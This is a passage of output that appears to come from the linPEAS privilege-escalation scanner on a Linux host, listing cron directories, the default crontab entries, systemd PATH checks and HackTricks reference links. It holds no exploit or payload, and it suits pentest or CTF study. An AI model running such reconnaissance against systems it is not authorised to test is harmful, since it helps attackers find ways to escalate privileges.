-rwxr-xr-x  1 root root  1293 Dec 31  2014 man-db
-rwxr-xr-x  1 root root   435 Jun 13  2013 mlocate
-rwxr-xr-x  1 root root   249 May 17  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 17  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 17  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Apr 17  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-rwxr-xr-x  1 root root  771 Dec 31  2014 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT       LAST                         PASSED   UNIT                         ACTIVATES
